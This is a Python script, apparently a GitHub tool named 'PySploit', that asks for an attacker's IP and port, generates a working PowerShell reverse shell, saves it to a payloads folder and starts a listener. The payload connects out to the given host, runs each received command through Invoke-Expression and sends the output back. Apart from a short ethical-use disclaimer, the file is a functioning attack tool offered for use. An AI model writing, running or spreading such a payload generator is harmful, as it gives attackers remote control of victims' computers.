import os
import uuid
import subprocess

# ASCII Art and Disclaimer
ascii_art = """
 ________  ___    ___ ________  ________  ___       ________  ___  _________   
|\   __  \|\  \  /  /|\   ____\|\   __  \|\  \     |\   __  \|\  \|\___   ___\ 
\ \  \|\  \ \  \/  / | \  \___|\ \  \|\  \ \  \    \ \  \|\  \ \  \|___ \  \_| 
 \ \   ____\ \    / / \ \_____  \ \   ____\ \  \    \ \  \\\  \ \  \   \ \  \  
  \ \  \___|\/  /  /   \|____|\  \ \  \___|\ \  \____\ \  \\\  \ \  \   \ \  \ 
   \ \__\ __/  / /       ____\_\  \ \__\    \ \_______\ \_______\ \__\   \ \__
    \|__||\___/ /       |\_________\|__|     \|_______|\|_______|\|__|    \|__|
         \|___|/        \|_________|                    
"""

credit_disclaimer = """
                                                       by Junied Abrar | Github:junied20
DISCLAIMER: This script is intended for ethical use only. Please ensure that you have proper authorization before using it. Unauthorized use can be illegal and unethical.
"""

# PowerShell Reverse Shell Script Generation
def generate_script(ip, port):
    return f"""$server = '{ip}'
$port = {port}

$client = New-Object System.Net.Sockets.TCPClient($server, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

while ($true) {{
    try {{
        $cmd = $reader.ReadLine()
        if ($cmd -eq 'exit') {{ break }}
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        $writer.WriteLine($output)
        $writer.Flush()
    }} catch {{
        break
    }}
}}

$reader.Close()
$writer.Close()
$client.Close()"""

# Main Function
def main():
    # Print ASCII Art and Disclaimer
    print(ascii_art)
    print(credit_disclaimer)

    print("\n🌐 Welcome to PySploit Setup!")
    
    # Get the IP and port for reverse shell connection
    target_ip = input("Enter IP for reverse shell to connect to (your public IP or DNS): ").strip()
    target_port = input("Enter port for reverse shell to connect to: ").strip()

    # Generate PowerShell script
    script = generate_script(target_ip, target_port)

    # Ensure the payloads directory exists
    if not os.path.exists("payloads"):
        os.makedirs("payloads")

    # Save the generated script to a file
    filename = f"payloads/reverse_shell_{uuid.uuid4().hex[:6]}.ps1"
    with open(filename, "w") as f:
        f.write(script)

    print(f"\n✅ PowerShell script saved as '{filename}'.")

    # Run listener.py after saving the payload
    print("\n🔄 Starting listener.py...")
    subprocess.run(["python", "listener.py"])

if __name__ == "__main__":
    main()
